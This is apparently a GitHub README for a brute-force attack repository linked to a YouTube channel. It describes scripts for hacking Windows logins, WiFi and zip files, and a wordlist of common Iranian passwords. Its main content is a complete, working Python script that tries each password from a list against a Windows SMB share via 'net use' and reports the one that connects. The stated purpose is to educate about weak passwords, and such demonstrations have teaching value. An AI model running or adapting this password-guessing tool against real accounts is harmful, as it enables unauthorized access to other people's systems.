# Brute-force attack

**Author:** Peyman Majidi Moein (aka Peymanx) and Ai

This project is related to a YouTube video on the [peymanx](https://www.youtube.com/@peymanx) channel.

## Table of Contents

- [Introduction](#introduction)
- [Sample Code](#sample-code)
- [Content List](#content-list)
- [Resources](#resources)
- [License](#license)

## Introduction

This repository contains various scripts and tools for performing brute-force attacks on different systems. The primary goal is to demonstrate the vulnerabilities and educate users on the importance of strong passwords and security measures.  

This repository contains a list of commonly used [passwords in Iran](./passwords/commons_iranians.txt). It's designed to help developers and security professionals understand password patterns in the region, improve password policies, and enhance security measures

## Preview
![login](https://github.com/user-attachments/assets/075a2c88-b7e9-41a7-8ee4-7d8e8392d867)

## Sample Code

```python
import os
from tqdm import tqdm
from colorama import Fore, Style, init

# Initialize colorama
init()
os.system('title @peymanx Windows Login Password Brute-force attack')

def connect_to_smb(ip, username, password):
    command = f'net use \\\\{ip} /user:{username} {password} >nul 2>&1'
    result = os.system(command)
    return result == 0

def read_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    return [password.strip() for password in passwords]

def main():
    ip = '127.0.0.1'
    username = 'peymanx'
    password_file = './passwords/common.txt'

    passwords = read_passwords(password_file)
    total_passwords = len(passwords)

    max_password_length = max(len(password) for password in passwords)
    with tqdm(total=total_passwords, desc="Trying passwords", unit="password") as pbar:
        for password in passwords:
            padded_password = password.ljust(max_password_length)
            pbar.set_description(f"{Fore.YELLOW}Trying password: {padded_password}{Style.RESET_ALL}")
            if connect_to_smb(ip, username, password):
                print(f'\n{Fore.GREEN}{"*"*70}')
                print(f'{Fore.GREEN}Successfully connected!')  # Blinking text
                print(f'{Fore.GREEN}Password: \'\033[5m{password}\033[0m{Fore.GREEN}\'')  # Blinking text
                print(f'{Fore.GREEN}{"*"*70}{Style.RESET_ALL}\n')
                break
            pbar.update(1)
        else:
            print(f'\n{Fore.RED}Password not found{Style.RESET_ALL}')

if __name__ == '__main__':
    main()
```

## Content List

- **passwords**
  - More password samples added (Jan 17, 2025)
- **login_hack.py**
  - Windows login hack 
- **wifi_hack.py**
  - WiFi hack 
- **zip_hack.py**
  - Compressed file password hack 

## Resources

- [SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments](https://github.com/danielmiessler/SecLists)
- [Persian Words Jadi :)](https://github.com/jadijadi/persianwords)
- [Iranian-Password-list](https://github.com/Dih4v/Iranian-Password-list)
- [Wikipedia](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
